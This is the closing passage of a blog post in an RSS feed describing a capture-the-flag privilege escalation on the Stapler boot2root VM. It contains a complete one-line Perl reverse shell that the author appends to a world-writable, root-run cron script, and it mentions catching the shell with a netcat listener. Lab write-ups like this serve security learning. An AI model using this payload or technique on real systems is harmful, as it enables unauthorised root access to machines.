&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image17.png&quot; alt=&quot;logrotate&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Seeing that I had permissions to write to a script that is run by the root user every 5 minutes got me super excited!&lt;/p&gt;

&lt;p&gt;I added a reverse shell using perl to this script:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;perl -e 'use Socket;$i=&quot;192.168.1.124&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))) {open(STDIN,&quot;&amp;gt;&amp;amp;S&quot;);open(STDOUT,&quot;&amp;gt;&amp;amp;S&quot;);open(STDERR,&quot;&amp;gt;&amp;amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image18.png&quot; alt=&quot;reverse shell in script&quot; /&gt;&lt;/p&gt;

&lt;p&gt;All that was left was to create a netcat listener on my attacking machine to listen for the reverse shell :-)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/stapler/image19.png&quot; alt=&quot;reverse shell connects&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;BOOM!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;That’s root&lt;/p&gt;

&lt;p&gt;In the end there are quite a few more messages left around the system including some in the ssl certificate and the message2.jpg file (using strings to display this). Thank you g0tmi1k for the great boot2root VM.&lt;/p&gt;
</description>
        <pubDate>Wed, 26 Jul 2017 19:34:00 -0600</pubDate>
        <link>http://ado.im/blog/ctf/stapler.html</link>
        <guid isPermaLink="true">http://ado.im/blog/ctf/stapler.html</guid>
        
        
        <category>ctf</category>
        
      </item>
    
  </channel>
</rss>
